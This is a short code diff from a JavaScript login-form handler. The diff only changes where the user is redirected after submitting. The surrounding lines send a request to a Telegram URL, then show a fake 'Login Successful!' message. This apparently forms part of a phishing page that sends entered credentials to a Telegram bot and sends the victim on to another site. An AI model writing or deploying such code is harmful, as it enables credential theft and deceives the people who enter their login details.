@@ -13,7 +13,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     fetch(telegramURL, { method: "GET" })
         .then(response => {
             alert("Login Successful!");
-            window.location.href = "https://my_website.com"; // 
+            window.location.href = "https://rh0099.github.io/MA-website2/"; // 
         })
         .catch(error => alert("Error logging in!"));
 });
